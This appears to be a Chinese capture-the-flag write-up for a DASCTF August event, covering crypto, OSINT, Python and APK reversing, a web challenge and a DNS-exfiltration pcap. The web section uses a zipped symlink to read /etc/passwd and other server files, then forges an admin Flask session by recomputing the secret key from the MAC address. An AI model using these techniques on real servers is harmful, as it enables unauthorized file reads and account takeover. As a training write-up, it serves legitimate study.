# DASCTF八月挑战赛writeup

<div class="has-toc have-toc">
</div>

## 0x00 easymath

题目代码

```
assert(len(open('flag.txt', 'rb').read()) < 50)
assert(str(int.from_bytes(open('flag.txt', 'rb').read(), byteorder='big') << 10000).endswith(
 '1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008'))
```

简单搜索，发现<a rel="noreferrer noopener" href="https://ctftime.org/writeup/22374" target="_blank" rel="nofollow" >https://ctftime.org/writeup/22374</a>有道类似的题目，修改后跑一下脚本。

```python
c = 1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008
mod = 5 ** 175
phi = 5 ** 175 - 5 ** 174
inv = pow(pow(2, 10000, mod), phi - 1, mod)
print(((c * inv) % mod).to_bytes(50, byteorder='big'))
```


<img loading="lazy" width="928" height="25" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-305.png" alt="" class="wp-image-3418" /> </figure> 

## 0x01 寒王's blog 

题目：<a href="http://hanwang2333.gitee.io/" target="_blank"  rel="nofollow" >http://hanwang2333.gitee.io/</a> 你滴寒王写了blog，看看寒王不小心留下了什么信息？

猜测需要找到flag.jpg<figure class="wp-block-image size-full">

<img loading="lazy" width="1449" height="768" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-306.png" alt="" class="wp-image-3419" /> </figure> 

扫描后台没有结果，因为blog是部署在码云上的，所以去看看。果然在一个分支里面找到了。<figure class="wp-block-image size-full">

<img loading="lazy" width="1124" height="546" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-307.png" alt="" class="wp-image-3420" /> </figure> 

按照blog上的操作解密一下，得到`flag{50aa7fe02602264e7d8102746416cd74}`。

## 0x02 py

下载下来是个py.exe，没做过这种逆向的，参考<a rel="noreferrer noopener" href="https://www.cnblogs.com/pluie/p/13621823.html" target="_blank" rel="nofollow" >https://www.cnblogs.com/pluie/p/13621823.html</a>和<a rel="noreferrer noopener" href="https://blog.csdn.net/weixin_44013208/article/details/88544142" target="_blank" rel="nofollow" >https://blog.csdn.net/weixin_44013208/article/details/88544142</a>，用<a rel="noreferrer noopener" href="https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py" target="_blank" rel="nofollow" >pyinstxtractor</a>把exe转为pyc文件。<figure class="wp-block-image size-full">

<img loading="lazy" width="1462" height="311" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-308.png" alt="" class="wp-image-3421" /> </figure> 

找到py文件，在用010editor打开，插入`03F30D0A000000`，将其重命名为py.pyc。<figure class="wp-block-image size-full">

<img loading="lazy" width="729" height="178" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-309.png" alt="" class="wp-image-3422" /> </figure> 

再用如下命令，转成python程序

<pre class="wp-block-code"><code>uncompyle6 -o 生成文件.py 目标文件.pyc</code></pre>

代码：

<pre class="wp-block-code"><code>
def encode(s):
    str = ''
    for i in range(len(s)):
        res = ord(s&#91;i]) ^ 32
        res += 31
        str += chr(res)

    return str


m = 'ek`fz13b3c5e047b`bd`0/c268e600e7c5d1`|'
strings = ''
strings = input('Input:')
if encode(strings) == m:
    print 'Correct!'
else:
    print 'Try again!'</code></pre>

写个简单的解密

<pre class="wp-block-code"><code>m = 'ek`fz13b3c5e047b`bd`0/c268e600e7c5d1`|'
str = ''
for i in range(len(m)):
	res = ord(m&#91;i]) - 31
	res = res ^ 32
	str += chr(res)
print (str)</code></pre>

得到结果`flag{24c4d6f158cacea10d379f711f8d6e2a}`

## 0x03 apkrev

用模拟器打开<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-310.png" alt="" class="wp-image-3424" width="201" height="306" /> </figure> 

jeb反编译后发现，加密函数和密文都在libnative-test.so这个文件里面。<figure class="wp-block-image size-full">

<img loading="lazy" width="1504" height="623" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-342.png" alt="" class="wp-image-3504" /> </figure> 

找到x86下对应的文件，进入ida分析，在函数窗口搜索mycheck就能定位。<figure class="wp-block-image size-full">

<img loading="lazy" width="1181" height="706" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-8.png" alt="" class="wp-image-3555" /> </figure> 

貌似需要用到动态调试，这里先留一个坑。<a rel="noreferrer noopener" href="https://blog.csdn.net/freeking101/article/details/106701908" target="_blank" rel="nofollow" >https://blog.csdn.net/freeking101/article/details/106701908</a>、<a rel="noreferrer noopener" href="https://bbs.pediy.com/thread-269129.htm" target="_blank" rel="nofollow" >https://bbs.pediy.com/thread-269129.htm</a>

## 0x04 babypython[国赛总决赛复现]

这题拿了先搜一下，发现和[HCTF 2018]Hide and seek很相似，于是参考<a href="https://blog.csdn.net/mochu7777777/article/details/105190181/" data-type="URL" data-id="https://blog.csdn.net/mochu7777777/article/details/105190181/" target="_blank" rel="noreferrer noopener" rel="nofollow" >文章</a>。<figure class="wp-block-image size-full">

<img loading="lazy" width="552" height="138" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-332.png" alt="" class="wp-image-3488" /> </figure> 

创建一个软链接指向服务器上的文件，试试看能不能读取。

<pre class="wp-block-code"><code>ln -s /etc/passwd link1
zip -y link1.zip link1</code></pre>

发现成功读到了。<figure class="wp-block-image size-full">

<img loading="lazy" width="1883" height="156" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-333.png" alt="" class="wp-image-3489" /> </figure> 

尝试读取`/proc/self/environ`提示you bad bad!，怀疑这里被过滤了。

<pre class="wp-block-code"><code>linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，
内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的信息。


maps 记录一些调用的扩展或者自定义 so 文件

environ 环境变量

comm 当前进程运行的程序

cmdline 程序运行的绝对路径

cpuset docker 环境可以看 machine ID

cgroup docker环境下全是 machine ID 不太常用</code></pre>

根据之前的writeup，admin账号应该就是靠cookie或者session验证的，所以查看一下页面cookie信息。确实发现了一个session。<figure class="wp-block-image size-full">

<img loading="lazy" width="556" height="51" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-334.png" alt="" class="wp-image-3491" /> </figure> 

在<a rel="noreferrer noopener" href="https://jwt.io/#debugger-io" target="_blank" rel="nofollow" >https://jwt.io/#debugger-io</a>上面解析一下。<figure class="wp-block-image size-full">

<img loading="lazy" width="1132" height="236" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-335.png" alt="" class="wp-image-3492" /> </figure> 

参考大佬的过程<a rel="noreferrer noopener" href="https://www.wolai.com/atao/hf4yLDPzB1rq471j4HMXDe" target="_blank" rel="nofollow" >https://www.wolai.com/atao/hf4yLDPzB1rq471j4HMXDe</a>，是通过`/app/y0u_found_it.ini`来获取，不是很能理解为什么跳到这一步了。这里尝试绕过，但没有成功，迷茫。不过省去这两步，直接当原题套过程也能拿到flag。<figure class="wp-block-image size-full">

<img loading="lazy" width="610" height="26" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-338.png" alt="" class="wp-image-3496" /> </figure> 

接着试`/app/y0u_found_it/y0u_found_it_main.py`，获取到源代码。

<pre class="wp-block-code"><code># -*- coding: utf-8 -*-
from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
import uuid
import base64
import random
import secret
from werkzeug.utils import secure_filename
import os
random.seed(uuid.getnode())
app = Flask(__name__)
app.config&#91;'SECRET_KEY'] = str(random.random()*100)
app.config&#91;'UPLOAD_FOLDER'] = './uploads'
app.config&#91;'MAX_CONTENT_LENGTH'] = 100 * 1024
ALLOWED_EXTENSIONS = set(&#91;'zip'])

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)&#91;1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=&#91;'GET'])
def index():
    error = request.args.get('error', '')
    
    if(error == '1'):
        session.pop('username', None)
        return render_template('index.html', forbidden=1)
    if not 'username' in session:
        session&#91;'username'] = "guest"
    
    if 'username' in session:
        return render_template('index.html', user=session&#91;'username'], secret=secret.secret)
    else:
        
        return render_template('index.html')


@app.route('/upload', methods=&#91;'POST'])
def upload_file():
    if 'the_file' not in request.files:
        return redirect(url_for('index'))
    file = request.files&#91;'the_file']
    if file.filename == '':
        return redirect(url_for('index'))
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_save_path = os.path.join(app.config&#91;'UPLOAD_FOLDER'], filename)
        if(os.path.exists(file_save_path)):
            return 'This file already exists'
        file.save(file_save_path)
    else:
        return 'This file is not a zipfile'


    try:
        extract_path = file_save_path + '_'
        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
        read_obj = os.popen('cat ' + extract_path + '/*')
        file = read_obj.read()
        read_obj.close()
        os.system('rm -rf ' + extract_path)
    except Exception as e:
        file = None
    
    os.remove(file_save_path)
    if(file != None):
        if(file.find(base64.b64decode('ZmxhZw==').decode('utf-8')) != -1):
            return redirect(url_for('index', error=1))
    return Response(file)


if __name__ == '__main__':
    #app.run(debug=True)
    app.run(host='127.0.0.1', debug=False, port=10008)</code></pre>

分析`app.config['SECRET_KEY'] = str(random.random()*100)`可以发现，所谓的SECRET_KEY是由随机数生成的一串字符串，而设置随机数种子的`random.seed(uuid.getnode())`的函数可以获取网卡mac地址并转换成十进制数返回，进而生成伪随机数。查找资料发现，可以通过`/sys/class/net/eth0/address`来获取MAC地址。<figure class="wp-block-image is-resized">

<img loading="lazy" src="https://img-blog.csdnimg.cn/20200714002326306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NyaXNwcng=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" width="462" height="182" /> </figure> 

获取到为`02:42:ac:10:98:e8`，跑下一脚本

<pre class="wp-block-code"><code>import uuid
import random

mac = "02:42:ac:10:98:e8"
temp = mac.split(':')
temp = &#91;int(i,16) for i in temp]
temp = &#91;bin(i).replace('0b','').zfill(8) for i in temp]
temp = ''.join(temp)
mac = int(temp,2)
random.seed(mac)
randStr = str(random.random()*100)
print(randStr)</code></pre>

得到结果`77.82254010793636`，再用flask-session-cookie-manager工具加密下，得到admin的sessio。

<pre class="wp-block-code"><code>python3 flask_session_cookie_manager3.py encode -s '77.82254010793636' -t "{u'username':u'admin'}"</code></pre>

bp抓包提交下<figure class="wp-block-image size-full">

<img loading="lazy" width="967" height="341" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片.png" alt="" class="wp-image-3511" /> </figure> 

## 0x05 stealer

题目：那女孩对我说说我是一个小偷

打开后`dns and ip.src==172.27.221.13`过滤一下，发现存在base64的图片<figure class="wp-block-image size-full">

<img loading="lazy" width="806" height="266" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-340.png" alt="" class="wp-image-3500" /> </figure> 

使用`tshark -r "dump.pcapng" -R "dns and ip.src==172.27.221.13" -2 -T fields -e _ws.col.Info>1.txt`命令提取所有的info字段。然后进行处理

<pre class="wp-block-code"><code>操作：
1、去除多余字符串”Standard query 0x.* A”、”ctf.com.cn OPT”、”-.”、“.”
2、将“*”替换为“+”
3、去掉换行</code></pre>

然后丢到cyberchef里面去<figure class="wp-block-image size-full">

<img loading="lazy" width="788" height="525" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-341.png" alt="" class="wp-image-3502" /> </figure>
